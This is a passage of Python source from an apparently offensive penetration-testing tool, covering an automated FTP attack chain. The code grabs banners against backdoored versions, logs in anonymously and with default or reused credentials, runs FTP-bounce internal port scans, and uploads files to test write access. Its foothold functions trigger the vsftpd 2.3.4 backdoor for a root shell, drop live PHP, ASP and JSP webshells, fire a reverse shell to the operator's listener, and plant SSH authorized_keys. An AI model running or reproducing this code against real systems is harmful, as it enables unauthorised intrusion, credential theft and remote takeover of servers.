        L.append(f"  {DIM}none surfaced — WinRM is creds-driven; check the SMB phase / searchsploit{RESET}")

    L.append(f"\n{BOLD}D. Post-exploitation loot (through the shell){RESET}")
    L.append(f"  {DIM}LSASS: nanodump / mimikatz sekurlsa::logonpasswords · DPAPI masterkeys · "
             f"browser creds · saved RDP/WiFi · KeePass{RESET}")

    if dom:
        L.append(f"\n{BOLD}E. AD escalation{RESET}")
        L.append(f"  {DIM}BloodHound (SharpHound) → ACL paths · Kerberoast / AS-REP roast · "
                 f"certipy find -vulnerable (ADCS ESC1-8) · delegation / RBCD{RESET}")
    if who:
        L.append(f"\n{BOLD}F. Accounts with WinRM access (target these){RESET}")
        L.append(f"  {CYAN}{', '.join(who[:10])}{RESET}")

    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
    L.append(f"  {DIM}after dumping hashes, re-spray them (r2) to reach more WinRM hosts{RESET}")
    L.append(f"  {DIM}add {dc} / the DC to /etc/hosts; sync the clock for Kerberos{RESET}")
    return "\n".join(L)


# ── FTP step 1: banner + version → searchsploit (stdlib ftplib) ────────────────
_FTP_KNOWN_VULN = [   # (banner regex, CVE, description) — famous FTP RCE/backdoor versions
    (r"vsftpd\s*2\.3\.4",       "CVE-2011-2523", "vsftpd 2.3.4 backdoor (user ':)') → root shell on 6200"),
    (r"ProFTPD\s*1\.3\.5",      "CVE-2015-3306", "ProFTPD 1.3.5 mod_copy (SITE CPFR/CPTO) → RCE"),
    (r"ProFTPD\s*1\.3\.3c",     "CVE-2010-4221", "ProFTPD 1.3.3c backdoor / telnet IAC → RCE"),
    (r"ProFTPD\s*1\.3\.[0-2]\b", "CVE-2010-4221", "ProFTPD ≤1.3.2 telnet IAC overflow"),
]


def _tool_ftp_banner(ip: str, port: int, proto: str) -> str:
    """FTP step 1 tool: grab the 220 welcome banner (stdlib ftplib), parse the product/version,
    record it as the service (-sV), flag famous RCE/backdoor versions (vsftpd 2.3.4, ProFTPD
    1.3.5 mod_copy / 1.3.3c) with their CVE, and query Exploit-DB with searchsploit when present.
    Read-only, no login. A host that doesn't answer FTP raises. Authorised targets only."""
    import ftplib
    try:
        ftp = ftplib.FTP(timeout=8)
        ftp.connect(ip, port)
        banner = (ftp.getwelcome() or "").strip()
        try:
            ftp.quit()
        except Exception:                                    # noqa: BLE001
            ftp.close()
    except Exception as exc:                                 # noqa: BLE001
        raise RuntimeError(f"no FTP banner on {ip}:{port} ({exc})")
    if not banner:
        raise RuntimeError(f"{ip}:{port} — empty FTP banner (not FTP?)")

    m = re.search(r"(vsFTPd|ProFTPD|Pure-FTPd|FileZilla(?: Server)?|wu-ftpd|Serv-U|glFTPd|"
                  r"Microsoft FTP)[^\d]*(\d+(?:\.\d+)+[a-z0-9]*)?", banner, re.I)
    product = m.group(1) if m else None
    version = m.group(2) if (m and m.group(2)) else None
    if product and version:                                  # record as the service (-sV-like)
        save_services(ip, [{"port": port, "proto": proto, "name": "ftp",
                            "product": product, "version": version}])

    lines = [f"[*] Banner: {banner}"]
    if product:
        lines.append(f"[*] Service: {product}{(' ' + version) if version else ''}")
    for rx, cveid, desc in _FTP_KNOWN_VULN:
        if re.search(rx, banner, re.I):
            lines.append(f"✗ VULN {desc} ({cveid})")

    ss = shutil.which("searchsploit")
    if ss and product and version:
        proc = subprocess.run([ss, "-j", "-s", "-t", product, version],
                              capture_output=True, text=True, timeout=30)
        try:
            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
        except ValueError:
            rows = []
        seen = set()
        for r in rows[:20]:
            edb = str(r.get("EDB-ID", "?"))
            if edb in seen:
                continue
            seen.add(edb)
            lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
            if len(seen) >= 8:
                break
    elif not ss and product:
        lines.append("· searchsploit not installed — check Exploit-DB for the version manually")
    return f"FTP banner — {ip}:{port}\n\n" + "\n".join(lines)


# ── FTP step 2: anonymous login → browse the tree (stdlib ftplib) ──────────────
_FTPANON_DEADLINE = 60           # s — wall-clock cap on the walk
_FTPANON_MAXDEPTH = 4
_FTPANON_MAXFILES = 300
# interesting files on an FTP tree: the SMB loot set plus web source / config / DB files
_FTP_LOOT_RE = re.compile(r"(?i)config|\.(?:php|aspx?|jsp|cgi|pl|py|sh|htaccess|db|sqlite3?)$")


def _ftp_walk(ftp, path: str, depth: int, files: list, dirs: list, deadline: float) -> None:
    """Recursively list an FTP tree (MLSD when supported, else ls/dir parsing), capped."""
    import time
    if depth > _FTPANON_MAXDEPTH or len(files) >= _FTPANON_MAXFILES or time.time() > deadline:
        return
    try:                                                     # MLSD: machine-readable (preferred)
        entries = list(ftp.mlsd(path or "."))
    except Exception:                                        # noqa: BLE001 — fall back to ls/dir
        raw = []
        try:
            ftp.dir(path or ".", raw.append)
        except Exception:                                    # noqa: BLE001
            return
        for ln in raw:
            mw = re.match(r"\d{2}-\d{2}-\d{2}\s+\S+\s+(<DIR>|\d+)\s+(.+)$", ln)  # Windows FTP
            if mw:
                name, is_dir, size = mw.group(2).strip(), mw.group(1) == "<DIR>", mw.group(1)
            else:
                parts = ln.split(maxsplit=8)                 # Unix ls -l
                if len(parts) < 9 or parts[0][0] not in "d-":
                    continue
                name, is_dir, size = parts[8], parts[0].startswith("d"), parts[4]
            if name in (".", ".."):
                continue
            full = (path.rstrip("/") + "/" + name) if path else name
            if is_dir:
                dirs.append(full)
                _ftp_walk(ftp, full, depth + 1, files, dirs, deadline)
            else:
                files.append((full, size if str(size).isdigit() else "?"))
        return
    for name, facts in entries:                              # MLSD path
        if name in (".", ".."):
            continue
        full = (path.rstrip("/") + "/" + name) if path else name
        typ = facts.get("type", "")
        if typ == "dir":
            dirs.append(full)
            _ftp_walk(ftp, full, depth + 1, files, dirs, deadline)
        elif typ == "file":
            files.append((full, facts.get("size", "?")))


def _tool_ftp_anon(ip: str, port: int, proto: str) -> str:
    """FTP step 2 tool: attempt anonymous login (anonymous:<any>) and, on success, recursively
    browse the tree (stdlib ftplib, MLSD/ls, capped) — reporting the directory/file inventory
    and flagging interesting files (configs / keys / backups / creds). Read-only, no writes. A
    host that doesn't answer FTP raises; anonymous denied returns a clean report. Authorised
    targets only."""
    import ftplib
    import time
    try:
        ftp = ftplib.FTP(timeout=8)
        ftp.connect(ip, port)
    except Exception as exc:                                 # noqa: BLE001
        raise RuntimeError(f"FTP unreachable on {ip}:{port} ({exc})")
    try:
        ftp.login("anonymous", "anonymous@pshunter")
    except ftplib.error_perm:
        try:
            ftp.quit()
        except Exception:                                    # noqa: BLE001
            ftp.close()
        return f"FTP anonymous — {ip}:{port}\n\n[*] anonymous login DENIED"
    except Exception as exc:                                 # noqa: BLE001
        raise RuntimeError(f"FTP login error on {ip}:{port} ({exc})")

    files, dirs = [], []
    _ftp_walk(ftp, "", 0, files, dirs, time.time() + _FTPANON_DEADLINE)
    try:
        ftp.quit()
    except Exception:                                        # noqa: BLE001
        ftp.close()

    interesting = [(p, s) for p, s in files if _SMB_LOOT_RE.search(p) or _FTP_LOOT_RE.search(p)]
    lines = ["✗ ANON anonymous login allowed",
             f"[*] {len(dirs)} dir(s), {len(files)} file(s)"
             + (f" (capped at {_FTPANON_MAXFILES})" if len(files) >= _FTPANON_MAXFILES else "")]
    for p, s in interesting[:25]:
        lines.append(f"! {p} ({s})")
    if not interesting:
        for p, s in files[:12]:
            lines.append(f"· {p} ({s})")
        if len(files) > 12:
            lines.append(f"· … +{len(files) - 12} more")
    lines.append("· download read-only files; test write access next (step 3)")
    return f"FTP anonymous — {ip}:{port}\n\n" + "\n".join(lines)


# ── FTP step 3: test write access (throwaway upload → verify → delete) ─────────
_FTPWRITE_DEADLINE = 60          # s — wall-clock cap
_FTPWRITE_MAXDIRS = 40           # directories to probe for write access


def _ftp_writable(ftp, dirpath: str) -> "tuple | None":
    """Test one dir for write access: cwd, STOR a throwaway marker, then delete it. Returns
    (writable_bool, deleted_bool) or None if the dir can't be entered. Reversible."""
    import io
    import random
    name = f"~pshw_{random.randint(10000, 99999)}.txt"
    try:
        ftp.cwd("/" + dirpath if dirpath else "/")
    except Exception:                                        # noqa: BLE001
        return None
    try:
        ftp.storbinary(f"STOR {name}", io.BytesIO(b"pshunter-write-test\n"))
    except Exception:                                        # noqa: BLE001 — not writable
        return (False, True)
    deleted = True                                           # writable → clean up immediately
    try:
        ftp.delete(name)
    except Exception:                                        # noqa: BLE001
        deleted = False
    return (True, deleted)


def _tool_ftp_write(ip: str, port: int, proto: str) -> str:
    """FTP step 3 tool: over anonymous access, find which directories are WRITABLE — for each
    (root + those discovered), it uploads a throwaway marker (~pshw_*.txt), confirms the STOR
    succeeded, then deletes it (reversible; a leftover is reported for manual cleanup). Writable
    dirs are the webshell / payload-drop surface (step 5). The ONLY FTP tool that writes. A host
    with no anonymous access raises. Authorised targets only."""
    import ftplib
    import time
    try:
        ftp = ftplib.FTP(timeout=8)
        ftp.connect(ip, port)
        ftp.login("anonymous", "anonymous@pshunter")
    except ftplib.error_perm:
        raise RuntimeError("anonymous denied — run ftp-anon (r2); write-test needs FTP access")
    except Exception as exc:                                 # noqa: BLE001
        raise RuntimeError(f"FTP unreachable on {ip}:{port} ({exc})")

    deadline = time.time() + _FTPWRITE_DEADLINE
    files, dirs = [], []
    _ftp_walk(ftp, "", 0, files, dirs, deadline)
    targets = [""] + dirs[:_FTPWRITE_MAXDIRS]                # root first, then discovered dirs

    writable, leftovers = [], []
    for d in targets:
        if time.time() > deadline:
            break
        res = _ftp_writable(ftp, d)
        if res and res[0]:
            writable.append("/" + d if d else "/")
            if not res[1]:
                leftovers.append("/" + d if d else "/")
    try:
        ftp.quit()
    except Exception:                                        # noqa: BLE001
        ftp.close()

    lines = ["[*] logged in as anonymous"]
    for w in writable:
        lines.append(f"✗ WRITABLE {w}  (throwaway uploaded & removed)")
    if writable:
        lines.append("· writable dir(s) → drop a webshell if a web root serves this path (step 5), "
                     "or stage a payload")
    else:
        lines.append("· no writable directory found for anonymous")
    for lo in leftovers:
        lines.append(f"⚠ {lo} — throwaway marker may be left behind (delete ~pshw_*.txt manually)")
    return f"FTP write test — {ip}:{port}\n\n" + "\n".join(lines)


# ── FTP step 4: known / default / reused credentials (targeted, no wordlist) ───
_FTPCREDS_DEADLINE = 120         # s — wall-clock cap
_FTPCREDS_MAX = 60               # ceiling on login attempts (targeted, not a brute)
_FTP_DEFAULTS = [                # curated FTP defaults — not a wordlist (lockout-safe)
    ("ftp", "ftp"), ("ftp", ""), ("ftp", "password"), ("admin", "admin"), ("admin", ""),
    ("admin", "password"), ("administrator", "administrator"), ("root", "root"), ("root", "toor"),
    ("root", ""), ("ftpuser", "ftpuser"), ("user", "user"), ("guest", "guest"), ("test", "test"),
    ("webadmin", "webadmin"), ("www", "www"),
]


def _ftp_login_test(ip: str, port: int, user: str, pw: str) -> "bool | None":
    """One FTP login attempt on a fresh connection. True=valid, False=rejected, None=conn error."""
    import ftplib
    try:
        f = ftplib.FTP(timeout=6)
        f.connect(ip, port)
        f.login(user, pw)
        try:
            f.quit()
        except Exception:                                    # noqa: BLE001
            f.close()
        return True
    except ftplib.error_perm:
        return False
    except Exception:                                        # noqa: BLE001 — connection error
        return None


def _tool_ftp_creds(ip: str, port: int, proto: str) -> str:
    """FTP step 4 tool: try a curated set of default FTP credentials plus any harvested password
    (reuse across services) against the login — targeted, NOT a wordlist brute, so it stays
    lockout-safe. Valid logins are saved to smb-creds ('ftp on <host>') for reuse. A full brute
    (hydra) stays manual and is printed. An unreachable host raises. Authorised targets only."""
    import time
    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]        # password reuse (no hashes)
    candidates, seen = [], set()
    for u, p in _FTP_DEFAULTS + reused:
        key = (u.lower(), p)
        if key not in seen:
            seen.add(key)
            candidates.append((u, p, (u, p) not in _FTP_DEFAULTS))     # (user, pass, is_reused)
    candidates = candidates[:_FTPCREDS_MAX]

    deadline = time.time() + _FTPCREDS_DEADLINE
    valid, conn_err = [], 0
    for user, pw, is_reused in candidates:
        if time.time() > deadline:
            break
        r = _ftp_login_test(ip, port, user, pw)
        if r is True:
            valid.append((user, pw, is_reused))
        elif r is None:
            conn_err += 1
            if conn_err >= 5:                                # target down / dropping us → stop
                break
    if conn_err >= 5 and not valid:
        raise RuntimeError(f"{ip}:{port} — FTP not answering login attempts (down / not FTP?)")

    if valid:                                                # persist to the canonical creds store
        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
        for user, pw, _r in valid:
            line = f"! {user}:{pw or '<blank>'} @ ftp on {ip} [{ip}]"
            blocks.setdefault(ip, [])
            if line not in blocks[ip]:
                blocks[ip].append(line)
        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)

    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse) · {len(valid)} valid"]
    for user, pw, is_reused in valid:
        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}" + ("  (reused)" if is_reused else ""))
    if not valid:
        lines.append("· no default/reused login worked")
    lines.append(f"· full brute (only if no lockout): hydra -L users.txt -P "
                 f"/usr/share/wordlists/rockyou.txt ftp://{ip}")
    return f"FTP credentials — {ip}:{port}\n\n" + "\n".join(lines)


# ── FTP step 5: FTP-writable dir served by a web root → webshell (RCE) ──────────
_FTPWEB_DEADLINE = 120
_FTP_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
_FTP_SHELLS = {   # inert exec-verify payloads (computed math marker — NOT a live command shell)
    "php": (".php", lambda mk, a, b: f"<?php echo '{mk}'.({a}*{b}).'{mk}'; ?>"),
    "asp": (".asp", lambda mk, a, b: f'<% Response.Write("{mk}" & ({a}*{b}) & "{mk}") %>'),
    "jsp": (".jsp", lambda mk, a, b: f'<%= "{mk}"+({a}*{b})+"{mk}" %>'),
}


def _gather_ftp_creds(ip: str) -> list:
    """(user, pass) FTP logins ftp-creds proved for this host ('ftp on <ip>' in smb-creds)."""
    out = []
    for sid, output in fetch_scripts(ip, 445, "tcp"):
        if sid != "smb-creds":
            continue
        for m in re.finditer(rf"! (\S+?):(\S*) @ ftp on {re.escape(ip)}\b", output or ""):
            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
    return out


def _ftp_open(ip: str, port: int):
    """Open an FTP session with the best available access (proven creds first, then anonymous).
    Returns (ftp, label) or (None, None)."""
    import ftplib
    for user, pw in _gather_ftp_creds(ip) + [("anonymous", "anonymous@pshunter")]:
        try:
            f = ftplib.FTP(timeout=8)
            f.connect(ip, port)
            f.login(user, pw)
            return f, user
        except Exception:                                    # noqa: BLE001
            continue
    return None, None


def _http_get(ip: str, port: int, path: str, tls: bool):
    """Stdlib GET; returns (status, body) or (None, '')."""
    import http.client
    import ssl
    try:
        conn = (http.client.HTTPSConnection(ip, port, timeout=8,
                                            context=ssl._create_unverified_context())
                if tls else http.client.HTTPConnection(ip, port, timeout=8))
        conn.request("GET", path, headers={"User-Agent": "pshunter"})
        r = conn.getresponse()
        body = r.read(200000).decode("utf-8", "ignore")
        conn.close()
        return r.status, body
    except Exception:                                        # noqa: BLE001
        return None, ""


def _tool_ftp_webshell(ip: str, port: int, proto: str) -> str:
    """FTP step 5 tool: if an FTP-writable directory is served by a web root, that is RCE. It
    uploads a marker via FTP and fetches it over HTTP to prove the mapping, then uploads an
    inert exec-verify payload (computed math marker, NOT a live command shell), confirms it
    executes, and removes both files (reversible). Reports the confirmed drop URL. Needs FTP
    access + an HTTP service on the host. Authorised targets only."""
    import io
    import random
    import time
    hports = [(p, p in (443, 8443)) for p, pr, _st in fetch_ports(ip)
              if p in _FTP_HTTP_PORTS and pr == "tcp"]
    if not hports:
        raise RuntimeError("no HTTP service on this host — nothing to correlate the FTP write with")
    ftp, who = _ftp_open(ip, port)
    if not ftp:
        raise RuntimeError("no FTP access — run ftp-anon (r2) / ftp-creds (r4) first")

    deadline = time.time() + _FTPWEB_DEADLINE
    files, dirs = [], []
    _ftp_walk(ftp, "", 0, files, dirs, deadline)
    wdirs = [d for d in ([""] + dirs[:20]) if (_ftp_writable(ftp, d) or (False,))[0]]

    served, rce = [], []
    for d in wdirs:
        if time.time() > deadline:
            break
        marker = f"~pshm_{random.randint(10000, 99999)}"
        try:
            ftp.cwd("/" + d if d else "/")
            ftp.storbinary(f"STOR {marker}.txt", io.BytesIO(marker.encode() + b"\n"))
        except Exception:                                    # noqa: BLE001
            continue
        base = d.split("/")[-1] if d else ""
        hit = None
        for hport, tls in hports:
            for path in [f"/{marker}.txt"] + ([f"/{base}/{marker}.txt"] if base else []):
                st, body = _http_get(ip, hport, path, tls)
                if st == 200 and marker in body:
                    hit = (hport, tls, path.rsplit("/", 1)[0])
                    break
            if hit:
                break
        if hit:
            served.append((("/" + d) if d else "/", f"{'https' if hit[1] else 'http'}://{ip}:{hit[0]}{hit[2]}/"))
            a, b, mk = random.randint(1000, 9999), random.randint(1000, 9999), f"pshFTP{random.randint(100, 999)}"
            for lang in _detect_web_langs(ip, hit[0], proto)[:2]:
                ext, gen = _FTP_SHELLS.get(lang, (None, None))
                if not ext:
                    continue
                shell = f"~pshs_{random.randint(10000, 99999)}{ext}"
                try:
                    ftp.storbinary(f"STOR {shell}", io.BytesIO(gen(mk, a, b).encode()))
                except Exception:                            # noqa: BLE001
                    continue
                spath = f"{hit[2]}/{shell}"
                st, body = _http_get(ip, hit[0], spath, hit[1])
                if st == 200 and f"{mk}{a * b}{mk}" in body:
                    rce.append((lang, f"{'https' if hit[1] else 'http'}://{ip}:{hit[0]}{spath}"))
                try:
                    ftp.delete(shell)
                except Exception:                            # noqa: BLE001
                    pass
                if rce:
                    break
        try:
            ftp.cwd("/" + d if d else "/")
            ftp.delete(f"{marker}.txt")
        except Exception:                                    # noqa: BLE001
            pass
    try:
        ftp.quit()
    except Exception:                                        # noqa: BLE001
        ftp.close()

    lines = [f"[*] FTP access: {who}   HTTP: {', '.join(str(p) for p, _t in hports)}"]
    for lang, url in rce:
        lines.append(f"✗ RCE {lang} {url}  (exec-verified, removed)")
    for d, urlbase in served:
        lines.append(f"✗ SERVED {d} → {urlbase}")
    if rce:
        lines.append("· FTP→web RCE confirmed — drop your webshell in the served dir over FTP")
    elif served:
        lines.append("· FTP dir is web-served but code didn't execute — try another extension / dir")
    else:
        lines.append("· no FTP-writable dir is served by the web root")
    return f"FTP → webshell — {ip}:{port}\n\n" + "\n".join(lines)


# ── FTP step 6: FTP-bounce (PORT) → scan the server's internal ports ───────────
_FTPBOUNCE_DEADLINE = 120
_BOUNCE_PORTS = {   # internal-only services worth finding via bounce (port → hint)
    22: "SSH", 23: "Telnet", 25: "SMTP", 445: "SMB", 1433: "MSSQL", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 5985: "WinRM", 6379: "Redis", 8000: "http-alt",
    8080: "http-alt", 8443: "https-alt", 9200: "Elasticsearch", 11211: "Memcached",
    15672: "RabbitMQ", 27017: "MongoDB",
}


def _ftp_port_spec(target_ip: str, target_port: int) -> str:
    """h1,h2,h3,h4,p1,p2 PORT argument for target_ip:target_port."""
    return ",".join(target_ip.split(".")) + f",{target_port >> 8},{target_port & 0xff}"


def _ftp_bounce_probe(ftp, target_ip: str, target_port: int) -> "str | None":
    """One bounce probe: PORT to target then LIST. 'open' / 'closed', or None if PORT rejected."""
    import ftplib
    try:
        if not ftp.sendcmd("PORT " + _ftp_port_spec(target_ip, target_port)).startswith("2"):
            return None
    except Exception:                                        # noqa: BLE001 — anti-bounce → rejected
        return None
    try:
        ftp.putcmd("LIST")
        r1 = ftp.getresp()                                   # 150 (data conn opening) or 4xx/5xx
    except ftplib.error_temp:                                # 425/426 → couldn't connect = closed
        return "closed"
    except Exception:                                        # noqa: BLE001
        return "closed"
    if not r1.startswith("1"):
        return "closed"
    try:
        return "open" if ftp.getresp().startswith("2") else "closed"   # 226 = connected
    except Exception:                                        # noqa: BLE001
        return "closed"


def _tool_ftp_bounce(ip: str, port: int, proto: str) -> str:
    """FTP step 6 tool: abuse the FTP PORT command (FTP bounce) to make the server open data
    connections to its OWN localhost — port-scanning internal-only services bound to 127.0.0.1
    that aren't exposed externally. First checks the server still allows foreign PORT (most
    modern servers disable it); if so, probes a set of common internal ports. Needs FTP access.
    Authorised targets only."""
    import time
    ftp, who = _ftp_open(ip, port)
    if not ftp:
        raise RuntimeError("no FTP access — run ftp-anon (r2) / ftp-creds (r4) first")

    supported = _ftp_bounce_probe(ftp, "127.0.0.1", 65534) is not None   # capability check
    if not supported:
        try:
            ftp.quit()
        except Exception:                                    # noqa: BLE001
            ftp.close()
        return (f"FTP bounce — {ip}:{port}\n\n[*] FTP access: {who}\n"
                "· FTP bounce not supported — the server rejects PORT to a foreign IP (anti-bounce)")

    deadline = time.time() + _FTPBOUNCE_DEADLINE
    found = []
    for p, hint in sorted(_BOUNCE_PORTS.items()):
        if time.time() > deadline:
            break
        if _ftp_bounce_probe(ftp, "127.0.0.1", p) == "open":
            found.append((p, hint))
    try:
        ftp.quit()
    except Exception:                                        # noqa: BLE001
        ftp.close()

    lines = [f"[*] FTP access: {who}   ·   bounce supported ✓"]
    for p, hint in found:
        lines.append(f"✗ BOUNCE 127.0.0.1:{p} open  ({hint})")
    if found:
        lines.append("· internal-only services reachable via the server — bounce-scan other "
                     "internal IPs the same way (PORT <internal-ip>)")
    else:
        lines.append("· bounce works but no probed internal port was open on 127.0.0.1")
    return f"FTP bounce — {ip}:{port}\n\n" + "\n".join(lines)


# ── FTP step 7: foothold — pick a viable path to a shell ───────────────────────
def _ftp_foothold_methods(ip: str, port: int) -> list:
    """Viable FTP foothold methods for this host, derived from earlier steps. (key, label)."""
    by_sid = {}
    for sid, out in fetch_scripts(ip, port, proto="tcp"):
        by_sid.setdefault(sid, out or "")
    methods = []
    if re.search(r"vsftpd\s*2\.3\.4", by_sid.get("ftp-banner", ""), re.I):
        methods.append(("backdoor", "vsftpd 2.3.4 backdoor → root bind shell on :6200"))
    if "✗ RCE" in by_sid.get("ftp-webshell", ""):
        methods.append(("web-rce", "FTP→web RCE → drop a webshell → reverse shell"))
    ssh_open = any(p == 22 and pr == "tcp" for p, pr, _s in fetch_ports(ip))
    if ssh_open and "✗ WRITABLE" in by_sid.get("ftp-write", ""):
        methods.append(("ssh-key", "writable dir + SSH → drop authorized_keys → ssh in"))
    return methods


def _ftp_fh_backdoor(ip: str, ftp_port: int) -> str:
    """Trigger the vsftpd 2.3.4 backdoor and spawn the root bind shell on 6200."""
    import socket
    import time
    print(f"{DIM}triggering vsftpd 2.3.4 backdoor (USER …:)) …{RESET}")
    try:
        s = socket.create_connection((ip, ftp_port), timeout=8)
        s.recv(256)
        s.sendall(b"USER pshunter:)\r\n")
        time.sleep(0.3)
        s.recv(256)
        s.sendall(b"PASS pshunter\r\n")
        time.sleep(1.0)
        s.close()
    except Exception as exc:                                 # noqa: BLE001
        print(f"{DIM}trigger error: {exc}{RESET}")
    up = False
    try:
        b = socket.create_connection((ip, 6200), timeout=5)
        b.close()
        up = True
    except Exception:                                        # noqa: BLE001
        pass
    if not up:
        print(f"{RED}✗ port 6200 not open{RESET} — backdoor patched or already consumed.")
        return "ftp-foothold: backdoor did not open 6200"
    cmd = f"nc {ip} 6200"
    term = _open_shell_terminal(cmd)
    if term:
        print(f"{GREEN}▶ spawned root shell in a new {term} window{RESET} {DIM}({cmd}){RESET}")
        tail = ""
    else:
        print(f"{YELLOW}headless{RESET} — run this yourself:\n  {BOLD}{cmd}{RESET}")
        tail = " (headless — command shown)"
    return f"ftp-foothold: backdoor shell → root@{ip}:6200{tail}"


def _ftp_fh_webrce(ip: str, port: int, proto: str) -> str:
    """Over the confirmed FTP→web RCE, drop a webshell via FTP, spawn a listener, fire a reverse shell."""
    import io
    lhost, lport = _foothold_lhost(ip), _free_local_port(4444)
    if not lhost:
        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
        return "ftp-foothold: no LHOST"
    if lport != 4444:
        print(f"{YELLOW}port 4444 is in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
    web = next((o for s, o in fetch_scripts(ip, port, "tcp") if s == "ftp-webshell"), "")
    served = re.search(r"✗ SERVED (\S+) → (\S+)", web)
    rce = re.search(r"✗ RCE (\w+) ", web)
    if not (served and rce):
        print(f"{YELLOW}re-run ftp-webshell (r5){RESET} — need a confirmed served dir.")
        return "ftp-foothold: no confirmed FTP→web RCE"
    ftpdir = served.group(1).strip("/")
    urlbase, lang = served.group(2).rstrip("/"), rce.group(1)
    ext = _FTP_SHELLS.get(lang, (".php",))[0]
    ftp, who = _ftp_open(ip, port)
    if not ftp:
        print(f"{RED}✗ no FTP access{RESET}")
        return "ftp-foothold: no FTP access"
    shell = f"~pshfh_{__import__('random').randint(10000, 99999)}{ext}"
    body = {".php": "<?php system($_GET['c']); ?>",
            ".asp": '<% Execute Request("c") %>',
            ".jsp": '<% Runtime.getRuntime().exec(request.getParameter("c")); %>'}.get(ext, "")
    try:
        ftp.cwd("/" + ftpdir if ftpdir else "/")
        ftp.storbinary(f"STOR {shell}", io.BytesIO(body.encode()))
        ftp.quit()
    except Exception as exc:                                 # noqa: BLE001
        print(f"{RED}✗ could not drop webshell: {exc}{RESET}")
        return "ftp-foothold: webshell drop failed"
    import time
    import tempfile
    import urllib.parse
    rlabel, _need, rtpl, rpty = _REVSHELLS[0]                 # python3 pty
    revsh = rtpl.replace("{ip}", lhost).replace("{port}", str(lport))
    https = urlbase.startswith("https")
    mport = re.search(r"//[^/]+?:(\d+)", urlbase)             # explicit :port on the served URL
    web_port = int(mport.group(1)) if mport else (443 if https else 80)
    path_q = f"/{shell}?c={urllib.parse.quote(revsh)}"
    trigger = f"{urlbase}/{shell}?c={urllib.parse.quote(revsh)}"
    print(f"{GREEN}✓ webshell dropped:{RESET} {urlbase}/{shell}  {DIM}(artifact — delete via FTP after){RESET}")

    # smart auto-upgrading listener (same engine as the HTTP foothold) — not plain nc
    upgrade = b"" if rpty else _FOOTHOLD_UPGRADE.encode()
    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport))
           .replace("__UPGRADE__", repr(upgrade)))
    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
    with os.fdopen(fd, "w") as fh:
        fh.write(src)
    used = _open_listener_terminal(spath)

    def _fire():
        try:
            _http_get(ip, web_port, path_q, https)
        except Exception:                                    # noqa: BLE001
            pass

    if not used:
        _safe_unlink(spath)
        print(f"{YELLOW}headless — no terminal to open.{RESET} Start a listener yourself:")
        print(f"  {BOLD}nc -lvnp {lport}{RESET}   {DIM}(on {lhost}){RESET}")
        print(f"then fire the shell:\n  {BOLD}curl '{trigger}'{RESET}")
        return f"ftp-foothold: web-rce headless — trigger shown ({urlbase}/{shell})"

    print(f"{GREEN}▶ smart listener opened in a new terminal{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
    print(f"  {DIM}firing {rlabel} through the webshell (auto-retry)…{RESET}")
    time.sleep(1.5)                                          # let the listener bind first
    for _ in range(3):                                       # auto-retry: beat the bind race / packet loss
        _fire()
        time.sleep(1.0)
    print(f"  {DIM}→ check the new terminal for your{RESET} "
          f"{GREEN}{'pty' if rpty else 'auto-upgraded'} shell{RESET}"
          f"{DIM}; if nothing landed, re-fire:{RESET} {BOLD}curl '{trigger}'{RESET}")
    return f"ftp-foothold: web-rce shell → {lhost}:{lport} (via {urlbase}/{shell})"


def _ftp_fh_sshkey(ip: str, port: int) -> str:
    """Generate a keypair, drop it into a writable dir's .ssh/authorized_keys, spawn ssh."""
    import subprocess
    import tempfile
    import io
    if not shutil.which("ssh-keygen") or not shutil.which("ssh"):
        print(f"{RED}✗ ssh-keygen/ssh not installed{RESET}")
        return "ftp-foothold: no ssh tooling"
    wdir = next((re.match(r"✗ WRITABLE (\S+)", ln).group(1)
                 for _s, o in fetch_scripts(ip, port, "tcp") if _s == "ftp-write"
                 for ln in o.splitlines() if ln.startswith("✗ WRITABLE")), None)
    if not wdir:
        print(f"{YELLOW}re-run ftp-write (r3){RESET} — need a writable dir.")
        return "ftp-foothold: no writable dir"
    d = tempfile.mkdtemp(prefix="pshfh_")
    key = os.path.join(d, "id_ed25519")
    subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key, "-q"],
                   capture_output=True, timeout=20)
    pub = open(key + ".pub").read().strip()
    ftp, who = _ftp_open(ip, port)
    if not ftp:
        print(f"{RED}✗ no FTP access{RESET}")
        return "ftp-foothold: no FTP access"
    ok = False
    try:
        ftp.cwd(wdir)
        try:
            ftp.mkd(".ssh")
        except Exception:                                    # noqa: BLE001
            pass
        ftp.cwd(".ssh")
        ftp.storbinary("STOR authorized_keys", io.BytesIO((pub + "\n").encode()))
        ftp.quit()
        ok = True
    except Exception as exc:                                 # noqa: BLE001
        print(f"{RED}✗ could not write authorized_keys: {exc}{RESET}")
    if not ok:
        return "ftp-foothold: authorized_keys write failed"
    user = wdir.strip("/").split("/")[-1] or "root"          # best-effort: dir name, else root
    cmd = f"ssh -i {key} -o StrictHostKeyChecking=no {user}@{ip}"
    print(f"{GREEN}✓ authorized_keys dropped in {wdir}/.ssh{RESET} {DIM}(guessing user '{user}'){RESET}")
    term = _open_shell_terminal(cmd)
    if term:
        print(f"{GREEN}▶ spawned ssh in a new {term} window{RESET} {DIM}({user}@{ip}){RESET}")
    else:
        print(f"{YELLOW}headless{RESET} — run: {BOLD}{cmd}{RESET}")
    return f"ftp-foothold: ssh-key shell → {user}@{ip}"


